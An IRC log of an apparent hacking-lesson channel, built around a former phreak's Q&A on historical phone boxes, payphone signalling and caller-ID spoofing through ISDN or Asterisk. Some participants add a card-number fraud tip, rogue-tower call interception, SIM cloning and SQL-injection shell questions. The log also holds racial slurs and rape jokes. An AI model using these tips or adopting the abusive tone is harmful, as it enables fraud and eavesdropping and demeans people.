18:27 <@strom> ----
18:27 <@strom> so
18:27 <@strom> to recap
18:27 <@strom> hi
18:27 <@strom> I'm Strom Carlson
18:27 <@strom> I was a phone phreak from 2002-2008
18:28 <@strom> in that time, I saw the rise of VoIP, the death of payphones, and essentially the death of traditional phreaking itself
18:28 <@strom> I've been inside telephone company switching facilities
18:29 <@strom> I've worked on old electromechanical switches
18:29 <@strom> I've gone out into the wild and figured out regional switching arrangements based solely on how payphones behave
18:30 <@strom> First question:
18:30 <@strom> <MrWonderful> death of phreaking? you mean there are no more vulns for payphones?
18:30 <@strom> Payphones don't exist in any appreciably usable form in north america anymore
18:31 <@strom> at least not in the united states; I haven't checked out canada in a while
18:31 <+n0de> i tried an old redbox method the other night at the payphone at my apt
18:31 <+n0de> by calling to op
18:31 < YmxldnB4> non-payphone related phreaking?
18:31 <+n0de> and having her place the call
18:31 <@xo> ive heard of this method
18:31 <+n0de> but they don't accept you putting in change when they placea call anymore
18:31 <+n0de> only credit card
18:31 <@strom> yeah, just hang on
18:32 <@strom> All the telco-operated payphones (the good ones, at least) were controlled by the switch they were connected to
18:32 <@strom> all coin signaling was generated by the phone and handled by the switch
18:32 <@strom> but that stuff was all ripped out by about 2006
18:33 <@strom> AT&T stopped accepting coins for long distance calls in 2001 sometime
18:33 <@strom> that was huge
18:33 <+n0de> yep
18:33 <@strom> <FakeBook> why cant european lines be phreaked the same way as in teh us ? and what are the diferences?
18:33 <@strom> Different countries all have different standards for how their phones operate
18:33 <@strom> it's a relic of the way the telephone developed in the 19th century
18:34 <@strom> the differences are extremely numerous and boring
18:34 <@strom> I'm getting a lot of chatter about boxes, so let me talk about that
18:35 <@strom> There were three "boxes" that were of any use
18:35 <@strom> the first was the "black box," which prevented a caller from being charged for calling your line
18:35 <@strom> the way it worked was to hold the line closed just enough to let the switch think you hadn't picked up yet
18:36 <@strom> it took advantage of the fact that, in the old electromechanical network, the audio path was complete before the call was answered
18:36 <@strom> when digital switching and trunking took over, they pretty much got rid of that by not allowing the calling party to talk forward until afte the called party answered
18:37 <@strom> the next box was called a "red box"
18:37 <@strom> it took advantage of the fact that payphones were dumb terminals and had to signal coins to the central switching office
18:37 <@strom> so the red box actually generated those coin tones
18:38 <@strom> but the real box was the "blue box"
18:38 <@strom> a blue box exploited the fact that at&t's entire network was controlled by tones the same way the payphones were
18:39 <@strom> so with a blue box, you could control AT&T's entire network from any phone
18:39 <@strom> and make free calls to anywhere
18:39 <@strom> so those were the three boxes
18:39 <@strom> there were other kinds of "boxes" that started showing up with the rise of the textfile scene
18:40 <@strom> but these were almost always either some stupid trick or something that didn't work at all
18:40 <+n0de> lol
18:40 <@strom> mainly, they were just the bullshit inventions of kids who wanted to be known for something
18:41 <+n0de> supposedly there was a box that dumped the change from payphones back in the day
18:41 <@strom> yeah, which was silly, because whoever wrote that file clearly had no understanding of how the payphone worked
18:41 <&Fox> According to textfiles you can probably find one that had nuclear fucking codes on it or some bullshit
18:41 <@strom> but that was phreaking in the 80s and 90s
18:41 <&Fox> point is, kids bullshitted a lot back in the day
18:41 <@strom> yes
18:42 <@strom> i'm open for questions
18:42 < FakeBook> thanks strom 
18:42 <@strom> what do you want me to talk about?
18:42 < lochsa1> redboxes still possible?
18:42 <@strom> i'm not done yet!
18:42 <@strom> don't go thanking me
18:42 <@strom> haha
18:42 < mohawk> Thank you for sharing
18:42 <@strom> ok, redboxes
18:43 <@strom> redboxing died its final death about 2005 when they took out all the local toll tandems' coin control subsystems
18:44 <@strom> but redboxing was in its death knell already, because AT&T stopped accepting coins in payment for toll calls in about 2001 or so
18:45 < m4tr1c3s> What was your favourite phreak?
18:45 <@strom> what do you mean?
18:45 < m4tr1c3s> if applicable
18:45 <&Fox> Favorite memory,
18:45 <&Fox> whatever.
18:45 < m4tr1c3s> yeah
18:46 < lochsa1> or aspect even
18:46 < DhrLazy> is there actually any (little) phreak what's still possible? (didn't follow whole talk, srry)
18:46 <@strom> a few questions that go together
18:46 <@strom> DhrLazy's question
18:46 <@strom> and <Am0s> so, do american toll phones no longer accept coins as an alternative to credit cards or other currencies?
18:47 <@strom> Phones are dead.
18:47 <@strom> The traditional network is fast going away and being replaced with the Internet
18:47 < YmxldnB4> So is phreaking still of any use today?
18:47 <@strom> I haven't kept up,  but at some point in the not terribly distant future, I expect to see all time-division switching and trunking to go away in favor of packet switching
18:48 <@strom> The Internet grew out of the phone network, and is now consuming it
18:48 <@strom> voice is becoming another application on the network
18:49 <@strom> hell, my current setup from AT&T has a modem on a high speed DSL link, and the phones (if I activate them) are handled out of that modem
18:50 <+lucky225> wtf
18:50 <+lucky225> why u h8
18:51 <@strom> I'd like him not to have voice while I'm speaking
18:51 <&Fox> What the shit.
18:51 <&Fox> fuck that.
18:51 <@strom> if you have a problem with that I can leave
18:51 <&Fox> Go ahead.
18:51 <%Robyn> Will this is interesting... 2 cop cars sitting outside my window...
18:51 <@strom> so anyway
18:51 <@strom> long story short
18:51 <@strom> voice isn't profitable anymore
18:52 <@strom> all the action is in mobile data and smartphones now
18:52 <@strom> and voice is basically just another type of data application
18:53 <@strom> There may be some phreaking that's still possible, but I really haven't kept up on what's possible
18:53 <@strom> It was already mostly dead in 2001
18:53 <@strom> We were just enjoying the last vestiges of the old network in their final years
18:54 <@strom> open for questions
18:54 < Bndr> any .txt for learn a bit phreaking ¿?
18:54 < m4tr1c3s> I have a question.
18:54 < MrWonderful> whats this about sle 4442
18:54 < FR0STY> maybe in the US phreaking is dead, but what about the other countries?
18:54 <@strom> m4tr1c3s: what's your question
18:54 < DhrLazy> It works with internet, thats wireless everywhere in the sky,. won't u think its able at a way to steal someone's data from hims phone while he's calling with some smart packet-logging-stuff? and than pre-use it to call from hims costs?
18:54 < m4tr1c3s> How did phreaking back in the day differ from modern hacking in terms of legality, how it was viewed etc
18:55 <@strom> DhrLazy: I can't for the love of god figure out what the hell you're trying to ask me
18:55 <+lucky225> I have a question, why strom think he's above everyone literally now?  This is a fucking anon irc channel, fuck off.  #2 phreaking ain't dead, you are. 
18:56 <&Fox> Oh wow.
18:56 <&Fox> Strom
18:56 <&Fox> I'm sorry, but callouts have to be addressed.
18:56 <&Fox> School him.
18:56 <@xo> haha
18:56 <@xo> THE FOX METHOD
18:56 <@xo> OF DEALING W/ TROLLS
18:56 <&Fox> Exactly.
18:56 <&Fox> Ok.
18:56 <+lucky225> wahhh
18:56 <&Fox> ...
18:57 <+n0de> hm
18:57 <&Fox> Lol did he quit?
18:57 <@xo> idk
18:57 <%Frosty> yup
18:57 <&Fox> Oh wow, lol.
18:57 <+lucky225> wtf
18:57 <&Fox> Well... YOU ALL WANT TO HEAR A FUNNY STORY ABOUT STROM?
18:57 <@xo> LOL
18:57 <&Fox> Sec, i need to make sure I can tell this story
18:58 <+lucky225> that dude seriously has some issues, we used to be boys now he kicking me from #school like he's the leader of anon when all he does is dj now b/c he quit digium?
18:58 < YmxldnB4> Why the fuck should I give you money
18:58 <&Fox> This nigga been giving us globals
18:58 <@xo> wtf are you blabbering about lucky225

18:59 <&Fox> Which made me lol
19:00 <+lucky225> AT&T is implimenting real anti-caller ID spoofing technology by detecting in-netwrok and off-network calls.  I think that's relevant to phreaking interests :P
19:00 <&Fox> my iphone was trying to do shit, so I just turned net off, and made voice.
19:00 <&Fox> lol
19:00 <@ErrProne> lucky is confused
19:00 <&Fox> Ok
19:00 <&Fox> so
19:00 <@ErrProne> strom said phreaking is dead

19:01 <&Fox> we're starting this off proper now
19:01 <@sharpie> yah
19:01 <&Fox> Mind giving us another global
19:01 <+lucky225> yeah iphone 3g is annoying sometimes, causes incoming calls to not ring

19:10 < n3th0les> lol @ loic
19:10 <+sharpie> YmxldnB4: I reckon it's the first test
19:10 < AngryWalrus> Do I need to prepare my notebook?
19:10 <&Fox> Also you use LOIC in here again, and get kb'd
19:10 < GregoryDEvans> ;D
19:10 <&Fox> We hate LOIC.
19:10 <&Fox> js.

19:10 <&Fox> We hate tos
19:10 <&Fox> *tor
19:10 <&Fox> JS.
19:10 < Ph3T> is there a way to prevent the data being returned from being cutoff when busting out some sqli?
19:10 < GregoryDEvans> I know
19:10 <+m4tr1c3s> tos sucks too tho :p

19:10 < Kayel> Notebook? just Log the IRC chat
19:10 < YmxldnB4> assembly was already done
19:10 <+lucky225> He's so #1 he h4x0r3d his way to defcon w/o being detected
19:11 <&Fox> Indeed.
19:11 <+anon9819823> Ah, gotcha.
19:11 < Gunzer> Just curious... why the TOR hate?
19:11 < acidburn> He's so #1 he got raped in jail w/o being detected.
19:11 <+m4tr1c3s> feds
19:11 <&Fox> End Node.
19:11 <+m4tr1c3s> ^
19:11 <&Fox> Simple and clean cut
19:11 < Gunzer> you mean monitoring at the end node?
19:12 < Gunzer> (or exit node)
19:12 <&Fox> Yes
19:12 < YmxldnB4> http://www.mediafire.com/?lhkgp4kp5phovv0
19:12 <+lucky225> Fed Node more like it
19:12 < YmxldnB4> http://www.mediafire.com/?lhkgp4kp5phovv0 fixed archive
19:12 <&Fox> Exactly.
19:12 < Gunzer> TOR still provides a great option for IP masking for those of us who know how to use SSL
19:12 < YmxldnB4> Fox: this is why you should encrypt everything
19:13 < N4N0> hey, does using certian frequency sounds still work for freaking?
19:13 < YmxldnB4> firefox addon https-everywhere helps
19:13 <&Fox> Indeed
19:13 <&Fox> This is a pro-tip
19:13 <+YmxldnB4> N4N0: most signalling is out-of-band nowadays
19:13 <&Fox> +2
19:13 <&Fox> goddamn
19:13 <&Fox> Anyways kids, we don't say we know everything
19:13 <&Fox> we just know more than most of you asshats.
19:14 <+anon9819823> Fox:  What do you think about teach some penetration testing techniques?
19:14 < Gunzer> nmap and nessus FTW?
19:14 < nikshadrin> k
19:14 <+anon9819823> Haha.  True that Fox.
19:14 <&Fox> I would be happy to do that
19:14 < N4N0> YmxldnB4: :-( dang electrical signals!
19:14 <+YmxldnB4> just get those of the goddamn man pages
19:14 < Kayel> S.A.T.A.N. FTW! Anyone remember that tool :)?
19:14 <&Fox> I'm using like 24 windows at the moment
19:14 <+YmxldnB4> Fox: go tell people to learn to read man pages
19:14 < Gunzer> Kayel: yes, I remember SATAN
19:14 <+anon9819823> Lol.
19:14 <&Fox> Ok
19:15 <&Fox> so who here is on nix like a boss?
19:15 <+m4tr1c3s> me
19:15 < Gunzer> Ahhh yes.... man pages... if you're into reading man pages, OpenBSD is for you
19:15 <+m4tr1c3s> ofc
19:15 <+YmxldnB4> yes here
19:15 <@ErrProne> like a baws
19:15 < Gunzer> Fox: yes here
19:15 < n3th0les> cant count xchat as boss though lol
19:15 <@ErrProne> irssi or bust
19:15 < nikshadrin> on nix, but no BOSS
19:15 < RichyB> are we able to ask questions in here. that would maybe help oters? 
19:15 <&Fox> Good you're ahead of the curve
19:15 <+YmxldnB4> quassel is quite fine
19:15 <&Fox> Yes you are
19:15 <+anon9819823> I'm on Debian 64.  My pride and joy.
19:15 <+YmxldnB4> it's like screen+irssi but with a gui
19:15 <+YmxldnB4> and it runs on android phones
19:15 <@ErrProne> i'm on a java client in ie akshully :(
19:16 <&Fox> Ok 
19:16 <&Fox> little protip
19:16 <+YmxldnB4> ErrProne: that's about the worst it can get
19:16 <&Fox> aws.amazon.com
19:16 <+YmxldnB4> amazon spies on you.
19:16 <&Fox> free tiny-ec2 instances
19:16 < Siouxsie> i saw your advert on the internet i was hoping i could learn something from here
19:16 < RichyB> Ok, so once iv found a vuln url using sql injection but looking through the db i dont find any username or passwords.. what is the next step to maybe getting a shell?
19:16 <+anon9819823> Cloud based services?
19:16 <&Fox> Amazon does
19:16 < acidburn> Fox: you're really smart giving away your info and cc heh
19:16 <+YmxldnB4> also, free?!
19:16 < acidburn> derp
19:16 < tzarni> hey sharpie

19:16 < Gunzer> YmxldnB4: one tiny instance free
19:16 <&Fox> Douchebag
19:16 < penguinman> Haha
19:17 <&Fox> YmxldnB4: they log
19:17 <@ErrProne> as long as it's a valid card number, it takes it
19:17 <+anon9819823> We need to make this like a radio show and utilize PM's.
19:17 <&Fox> but they cant keep for ever
19:17 <&Fox> js
19:17 <@ErrProne> doesn't matter if it's being used or not
19:17 <+YmxldnB4> Fox: also this is just a goddamn web service, not even a vps
19:17 <@ErrProne> you can google a valid num up for amazon in 2 seconds
19:17 <+anon9819823> PM Screen.
19:17 <&Fox> are you retarded.
19:17 <&Fox> Don't

19:21 <+YmxldnB4> xo: buffer overflow
19:21 < Siouxsie> uhh so wait you guys aren't hackers you're just rich kids who know a little bit about computers and want to make a name for yourselves by knowing what needs done but not how to do it then paying others to do it for you?
19:21 <+anon9819823> I want a free VPS!  :D
19:21 <@xo> thats one of them, YmxldnB4 
19:21 <@xo> theres two
19:21 <+YmxldnB4> xo: do I need a working exploit?

19:21 <@xo> yes
19:22 < Siouxsie> yes i am retarded
19:22 <+sharpie> yeah it was e who put me on to the free ec2 and when I saw all that amazon were offering it's O_O , they got loads of interesting shit there
19:22 < acidburn>  /disconnect hack the planet, fox you get raped in jail k? bb
19:22 < Siouxsie> what's your point
19:22 <@xo> its just for funs/learning tho
19:22 <@xo> you dont need anything
19:22 < mib_frog> im not rich, i just want some info to get me started knowing languages terms and stuff 
19:22 <%Frosty> do we have to give you code xo?
19:22 <+anon9819823> So what's the target for exploitation?
19:22 < RichyB> fox, so once iv found a vuln url using sql injection but looking through the db i dont find any username or passwords.. what is the next step to maybe getting a shell?
19:22 <@xo> anon9819823: see my pastebin
19:22 < Siouxsie> why bring up such a mute point, of course i'm retarded, you advertised on 4chan you dumb fucks
19:22 <@xo> http://pastebin.com/iZDJGiVv
19:22 <+YmxldnB4> xo: but linux has stack randomization
19:22 < ZeroC00l> anon9819823, nano
19:22 <&Fox> Oh did we?
19:22 <@xo> so dont do it on linux
19:22 <&Fox> Thats awesome.

19:25 < dagon> kthxbai
19:25 < ch4inm4n> dagon: just cause im here 
19:25 <&Fox> Thanks dagon 
19:26 <@xo> o man
19:26 < MrWonderful> the pastebin lets u use any file u want
19:26 <@xo> i wanna talk about
19:26 <@xo> ptrace_attach
19:26 < dagon> Fox, are the lessons scheduled somewhere or something? or just whenever teachers show up
19:26 <@xo> at some point
19:26 <&Fox> @blackhatacademy
19:26 < dagon> oic
19:26 <&Fox> Follow that for updates
19:26 < dagon> i will
19:26 <&Fox> also, we are setting up new boxes
19:26 <@xo> Fox: what was that backdoor
19:26 <@xo> that used ptrace attach?
19:26 < ch4inm4n> !topic
19:26 <&Fox> Oh you cunt
19:27 <&Fox> I cant remember
19:27 <&Fox> anyways
19:27 <&Fox> whatever
19:27 <&Fox> So
19:27 <&Fox> Phreaking talk 
19:27 <&Fox> back up
19:27 <&Fox> Message +h for voice
19:27 <&Fox> message questions to xo or strom
19:27 <&Fox> Be a douche
19:27 <&Fox> get a kb
19:27 <@xo> ^
19:27 <&Fox> go.
19:27 <@xo> banhammer is in hand
19:27 <@strom> so last time I got a whole bunch of questions about "is it still possible" and "how do I make free calls"
19:28 <@strom> getting free calls was never the point
19:28 <@strom> the only ones who cared about getting free calls were the worthless kiddies who would come and go pretty regularly
19:29 <@strom> the real goal was to understand the network, understand how it operated, what made it tick, why it was the way it was, etc etc
19:29 <@strom> it was fun to mess with the network, sure
19:29 <@strom> throw it things it didn't expect, make it break in interesting ways, get it to do things you couldn't ordinarily do
19:29 <@xo> btw to answer an earlier question about the challenge, you can disable stack address randomization, itll still count. the point is for ti to be simple
19:30 <@strom> but the people who were just out to make free calls were just petty thieves in my view
19:30 <@strom> i'm open for another question
19:30 < N4N0> but, how DO you make free calls?
19:30 <+Kayel> SIM Card Cloning
19:30 < N4N0> lol
19:30 < Siouxsie> ^
19:30 <+Kayel> Sim cards for Payphones
19:30 <&Fox> Sim cloning
19:31 <@strom> I was never big into the mobile side of things
19:31 <&Fox> Ok
19:31 <&Fox> Then i'll get on that
19:31 <@ErrProne> google voice = free calls, move along
19:31 <&Fox> Still to this day, you can jack live phone info
19:31 <&Fox> Not concurrently,
19:32 <&Fox> but two phones on hardware network IE: Verizon, Sprint can exist.
19:32 <&Fox> We'll discuss more later. 
19:32 <&Fox> More q's
19:32 < mug> What level do you need to have to follow these lessons?
19:32 < RichyB> does this rule apply to eu as well as us?
19:32 < Siouxsie> is eu a country or a state?
19:33 <@strom> One thing I should point out is that I never touched anything European
19:33 <@strom> My experience was limited to the U.S. and Canada
19:33 <@strom> I did play with phones in Mexico and England, but never in any depth
19:34 <@strom> so please stop asking "what about the EU" type questions
19:34 <@strom> I'm open for more questions
19:34 <@xplicit> what was 8 afraid of 7?
19:35 <@xplicit> why**
19:35 <@xo> har
19:35 < N4N0> xplicit: 7 ate 9
19:35 <@xo> hush now
19:35 < Siouxsie> 7 was a nigger
19:35 < N4N0> lol
19:35 <@xplicit> ^^^^^^^^^
19:35 <@xplicit> Siouxsie: is the winner
19:35 <@xo> sshhh
19:35 <@xo> questions
19:35 <&Fox> strom: 
19:35 < Siouxsie> can i get +v now
19:35 <@xo> only plz
19:35 <@strom> I see this is a channel full of mature and responsible individuals
19:35 <+Kayel> Hear hear
19:35 < Siouxsie> ok strom, good question for you, if i have two phones, can i call one from the other without it knowing?
19:35 <&Fox> What was your favorite part of learning the phone systems, give a story.
19:36 < TinderX> !np
19:36 <+Kayel> Are VoIP hacks considered a form of Phreaking?
19:36 <+anon9819823> The mature and responsible end up getting +v.
19:36 <@strom> Siouxsie: what do you mean, exactly?
19:36 <+Siouxsie> like can i make a phone do stuff while not at that phone
19:36 <&Fox> Phone taps?
19:36 <+Siouxsie> no specific phone is just like, say there is another phone, dial through that
19:36 <@strom> I don't understand what you mean
19:36 <+Siouxsie> make it look like number+physical location of other phone
19:37 <+Siouxsie> to the destination phone
19:37 <@strom> oh
19:37 <@strom> ok
19:37 <+Siouxsie> but be dialling from a different one
19:37 <@strom> let me explain that
19:37 <@xo> i have a question for you, actually
19:37 <@xo> when youre done
19:37 <@strom> There are (or at least there were) ways to show your call coming from a different station than the one from which you're actually dialing
19:38 <@strom> this is called "spoofing"
19:38 <@xplicit> I have a real question this time, when xo's turn is done
19:38 <@strom> spoofing the calling number is fairly easy (this is what becomes caller ID); spoofing the billing number is harder but still doable
19:39 <@strom> there were other things too, like the code that identifies whether you're calling from a mobile phone, a pay station, a regular phone, etc etc
19:39 <+Siouxsie> a network id?
19:40 <@xo> biling # = ani
19:40 <@xo> right strom?
19:40 <@xo> billing*
19:40 <@strom> in the vaguest sense, yes
19:40 <@strom> ok, xo had a question
19:40 <@strom> ask away
19:40 <@xo> my question is related to that
19:40 <@xo> how does ANI work? i know 911, and i think some call centers use it (for billing purposes?)
19:40 <@strom> ok
19:40 <@strom> so
19:40 <@xplicit> ^ that was my question, but I wouldn't have sounded as smart asking it
19:41 <@xo> haha
19:41 <@xplicit> well mine was more on how to drop the ANI, if that fits in with the explination strom 
19:42 <@strom> "ANI" is kind of a generic catch-all term the more ignorant phone phreaks use when talking about the party and billing information contained within the SS7 call setup message
19:42 <@strom> basically, there are several numbers of importance:
19:42 <@xo> >more ignorant phone phreaks
19:42 <@xo> aka xo
19:42 <@strom> - the dialed number
19:42 <@strom> - the directory number of the calling station
19:42 <@strom> - the billing number
19:43 <@strom> - the type of station
19:43 <@strom> and there is also a forwarding number spot or something of that sort
19:43 <@strom> it's been a while
19:44 <@strom> anyway
19:44 <@strom> for most residential and business phone service, this information is set by the end office switch
19:45 <@strom> however, if you have an ISDN PRI circuit, you can set much of this information yourself on your PBX, as the whole point of ISDN is to move as much intelligence to the edge of the network as possible
19:46 <@xplicit> I just cringed, ISDN was never my friend
19:46 <@strom> I like ISDN PRI
19:46 <@strom> never dealt much with BRI though
19:46 <@strom> that's a different animal
19:46 <@strom> so anyway
19:47 <@strom> the trick was to figure out how to get access to a PBX to set this stuff yourself
19:47 <@strom> once Asterisk happened, of course, this all became much easier, because a lot of the VoIP protocols were designed to map to ISDN signaling, which of course maps right to SS7
19:48 <@strom> so if you understood how to manipulate the various parts of the ISDN SETUP message, you were pretty much good to go
19:48 <+Kayel> Are VoIP hacks considered a form of Phreaking?
19:49 <@strom> it depends
19:49 <@strom> if you're exploiting some aspect of the VoIP protocol to gain access to the system via a terminal or something, then no
19:49 <@strom> if you're manipulating the phone call itself, then yes
19:50 <@strom> does that distinction make sense?
19:50 <@xplicit> So strom you're saying you'd have to have your own pbx such as asterisk to be able to mulipulate the various parts of the ISDN SETUP message?
19:50 <@strom> xplicit: generally yes
19:50 <+m4tr1c3s> strom
19:50 <+m4tr1c3s> in your experience, did the phreakers generally keep us with computer and internet hacking?
19:50 <+m4tr1c3s> up*
19:51 <@strom> Some did, some didn't.
19:51 <+m4tr1c3s> fair enough
19:51 <+m4tr1c3s> hey d1zzy
19:52 <@strom> I'm open for more questions
19:52 < d1zzY> sup
19:52 < MrWonderful> eavesdropping on cellphones possible?
19:52 <+m4tr1c3s> the class has begun
19:52 <+m4tr1c3s> currently a talk from strom :)
19:52 <@xplicit> What do you mean by generally? Was/is there a way that you don't have to have your own pbx to do it? 
19:52 <+m4tr1c3s> on phreaking
19:52 < d1zzY> yeah? i'm just here
19:52 < d1zzY> to log
19:52 < d1zzY> got lots of homeowrk ot catch up
19:52 <+m4tr1c3s> cool
19:52 <+m4tr1c3s> lol
19:52  * m4tr1c3s shuts up
19:53 <@strom> OK
19:53 <@strom> first thing first
19:53 <@strom> I NO LONGER DO THIS STUFF
19:53 <@strom> so please don't ask me if things are still possible
19:53 <@strom> as I generally don't know
19:54 <@strom> xplicit: If you had access to a PBX, you could do the same thing
19:54 <@strom> you didn't need to own one
19:54 <@strom> asterisk just made it cheap and easy
19:54 <@xplicit> Okay that's what I figured just wasn't sure if you meant there was another way besides going through a pbx to do so.
19:54 <@strom> well, there were ways you could have operators key things in
19:55 <@strom> but those were always a little risky because you're talking to a person
19:55 < Backslash> MrWonderful - it is possible to intercept GSM traffic, decode and hence eavesdrop a call. You need some heavy gear to do it though.
19:55 < MrWonderful> what do you do now strom?
19:55 < MrWonderful> ok ty back
19:56 <@strom> now, I DJ, write music, tend bar, and study psychology
19:56 <+Siouxsie> what sort of music?
19:56 <@xplicit> music is actually good to - I know from experience... or something
19:57 <@strom> trashy commercial pop music designed to sell a million copies and make a lot of money
19:57 <@ErrProne> http://www.bbc.co.uk/news/technology-12094227
19:57 <@strom> I appreciate the diversion into mobile hacking

20:01 <+m4tr1c3s> 'still'
20:01 <@strom> hey everyone
20:01 <@strom> let me repeat
20:01 <@strom> I DON'T DO THIS ANYMORE
20:01 <@strom> I DON'T KNOW WHAT'S STILL POSSIBLE
20:01 <@strom> ASK ME ABOUT THE PAST, NOT THE PRESENT
20:01 <@xplicit> let me rephrase my question
20:01 <+Siouxsie> what was your favourite thing that you did in the past that sadly can't be done now
20:02 <@xplicit> strom: were payphones a good way to stay anonymous, and do you THINK they could still be used the same way?
20:02 <@xo> o lord
20:02 <@xo> did we netsplit
20:02 <@xo> or something
20:02 <+Siouxsie> >mfw joinflood
20:02 <&Fox> lol
20:02 <@xo> ah
20:02 <@strom> I'm gonna wait for this to quiet down before I answer
20:02 <+m4tr1c3s> it's because of the announcement
20:02 <&Fox> Someone get Ruler in here
20:02 <@strom> heh ok

20:03 <&Fox> Period.
20:03 <+m4tr1c3s> is this foxinsocks shit a troll?
20:03 <@xo> idk
20:03 <@strom> ok, so
20:04 <&Fox> rofl
20:04 <&Fox> stop
20:04 <+m4tr1c3s> lol
20:04 <@strom> the payphone question first, then Siouxsie's question
20:04 <&Fox> Assholes.
20:04 <@strom> Payphones were a reasonably decent way to stay anonymous, although as with any terminal, your usage patterns could identify you
20:04 <&Fox> sabu Tweeted
20:04 <&Fox> rofl
20:04 <+anon9819823> I'll tell you something about the present.  Everyone asks about intercepting a call.  The idea is that when your mobile phone authenticates with the network, it searches for a mobile phone tower.  The issue with this is that your phone doesn't know every mobile tower known to man, so technically any mobile tower will do.  If you build your own mobile tower, you can tap into as many calls in the area as you want, as well as provide service to deadspots.
20:05 <&Fox> Go

20:13 <@xo> hahaha
20:13 <+anon9819823> What's black hat academy?
20:13 <@xo> gogogo
20:13 <@xo> anon9819823: not the time for that question
20:13 <@strom> ok
20:13 <@strom> I don't even know where the fuck I was anymore
20:13 <@strom> so
20:13 <+Siouxsie> strom, what was your favourite thing that you did in the past that sadly can't be done now
20:13 <@xo> i think ANI
20:13 <+Siouxsie> unless someone has a more technical question that is more pertinant, i thought at least stay on topic and learn something interesting
20:14 <@strom> Siouxsie: I don't miss any of it.  It was fun while it lasted, but now it's in the past.
20:14 <+Siouxsie> that wasn't what i asked but ok
20:14 <@strom> well, what did you ask then?
20:14 <@strom> you asked me a question of sentiment
20:14 <@xo> patri0t: go ahead
20:14 <+Siouxsie> i asked what your favourite thing was, not whether you missed it, but it's cool if you don't wanna bring up the past
20:14 <@strom> heh
20:14 <@strom> ok man
20:14 <+Siouxsie> i've done some pretty nasty things i'm not proud of
20:14 <+patri0t> Strom :  Give us an incidence where you used social engineering and how did you do that
20:15 <@strom> ok hang on
20:15 <@strom> let me finish Siouxsie's question
20:15 <+patri0t> no problem
20:15 <@strom> jeez xo, pay attention
20:15 <@strom> do your job
20:15 <@strom> moderate
20:15 <@xo> gogogo
20:16 <@strom> my favorite thing was figuring out how the network worked, finding interesting recordings, and finding quirks within the network
20:16 <@strom> being able to tell the difference between a 5ESS and a DMS-100 based on the way the dial tone came on
20:16 <@strom> being able to tell what kind of toll tandem I was using based on the recording it played
20:17 <@strom> finding weird pieces of equipment
20:17 <@strom> that sort of thing
20:17 <@strom> does that answer your question? :)
20:17 <+Siouxsie> yes
20:17 <+Siouxsie> :)
20:17 <@xplicit> strom: what was the most interesting number you stumbled upon, be it conf line or other
20:18 <@strom> JESUS CHRIST PEOPLE
20:18 <@strom> ONE QUESTION AT A TIME
20:18 <@strom> patri0t: social engineering, eh?
20:18 <@strom> let me think
20:19 <@strom> When I moved to Las Vegas in 2003, I set up a business line with telco voicemail
20:19 <@strom> the telephone set I had had a voicemail indicator lamp, so I figured it would be cool to try
20:19 <@strom> the lamp behaved unexpectedly, though...I think it would turn on but never turn off or something.
20:20 <@strom> the way the lamp works on those kinds of phones is that the network sends "lamp on" and "lamp off" signals in the same way it sends caller ID signals
20:20 <@m4tr1c3s> thx
20:21 <@xo> help us moderate
20:21 <@xo> lol
20:21 <@m4tr1c3s> lol
20:21 <@xo> 217 nicks and 7 ops
20:21 <@xo> :|
20:21 <%Frosty> D
20:21 <+patri0t> yeah , I am listening strom
20:21 <@strom> I grabbed my buttset and listened to the line, and found that the switch wasn't sending (or that I wasn't getting, at least) the "lamp off" message
20:21 <@strom> so I called repair service and tried to explain the problem
20:22 <@strom> to make a very long story very short, this baffled the shit out of the telephone company
20:22 <@strom> no one could figure out what the problem was
20:23 <@strom> I spoke on the phone with increasingly powerful people, including the guy who adminstered the voicemail system for the entire las vegas valley
20:23 <&Fox> Ok
20:23 <@strom> hey
20:23 <@strom> i'm  not done
20:23 <@strom> stop that
20:23 <&Fox> DAMNIT
20:23 <&Fox> THERE.

20:25 < XjSv> Will there be a log of this for download?
20:25 <+syria> EVERYONE BE QUIET
20:25 < FoxInSocks612> good good
20:25 < [Joe]> Wow this lost control
20:25 <&Fox> There will be a log
20:25 < FoxInSocks612> good god*
20:25 < Buczk-Claw> +m
20:25 < FoxInSocks333> CDMA  MITM's... why aren't there more?
20:25 < FoxInSocks840> U MAD PPL?
20:25 <+syria> Please reset +m
20:25 < XjSv> Thank you
20:25 < h3x> What is a good reading source for learning the core basics of information gathering in the pre-stage of launching a hack attack?
20:25 <@xo> ok
20:25 < FoxInSocks612> +m
20:25 < KYS> Hello everyone
20:25 < FoxInSocks857> .
20:25 < husdhuhsd> Eae Colegas!
20:25 <&Fox> So... I only got like
20:25 <&Fox> 1 PM for the story.
20:25 <&Fox> rofl
20:25 <&Fox> here is one more
20:25 <&Fox> without spam
20:25 <+syria> strom: ok, please continue
20:26 <@xo> Fox: leave it +m, let him finish
20:26 <&Fox> He needs 
20:26 <&Fox> op
20:26 <@xo> we've got all day
20:26 <@xo> lol
20:26 <&Fox> LOL
20:26 <&Fox> HE LEFT
20:26 <&Fox> AGAIN
20:26 <&Fox> hahahaha
20:26 <@xo> o godamit
20:26 <@xo> fuck it
20:26 <&Fox> Fuck it
20:26 <@xo> lets roll
20:26 < hypotenuse> I was curious as to how you got them to explain themselves without their inquiry as to your intentions?
20:26 <&Fox> Lol
20:26 < dagon> of course he left dude
20:26 <@xplicit> so I have an idea
20:26 < Sorinan> Simple question: ppl are really discovering zerodays everyday or most of attacks are just scriptkiddies with luck?
20:26 < h3x> What is a good reading source for learning the core basics of information gathering in the pre-stage of launching a hack attack?
20:26 <&Fox> Strom = easily butthurt
20:26 < dagon> you kicked him
20:26 < FoxInSocks952> http://www.facebook.com/pages/Get-off-my-job-site/136580563086833    <LIKE XD
20:26 <+lucky225> yeah
20:26 < aoeuidhtns> RMS
20:26 <+lucky225> If i wasn't working
20:26 < dagon> this is ridiculous
20:26 < wtf666> aaaaaaaaaaaa
20:26 <+lucky225> we could open a real discussion
20:26 <@xplicit> I say lucky225 is more qualified for this QnA 
20:27 <@xo> ErrProne: RISE
20:27 <&Fox> I like you
20:27 <&Fox> Ok, so kids
20:27 <+lucky225> x: yes I'm working atm tho
20:27 <&Fox> To start off,
20:27 <@xo> well lucky225 can continue if he'd like
20:27 <@xo> ah
20:27 <+syria> Well, let's get to actual school.
20:27 <&Fox> If you haven't read our logs
20:27 <&Fox> from prior classes
20:27 <@xplicit> lucky225: be serious, you don't work :p
20:27 <+lucky225> hahaha
20:27 <&Fox> Doso, they're pretty fucking good.
20:27 <&Fox> So,
20:27 <&Fox> Now we're going to move down the line
20:27 <&Fox> Who wants PM spam?
20:28 <&Fox> Xo.
20:28 <&Fox> Message XO with the next topic.
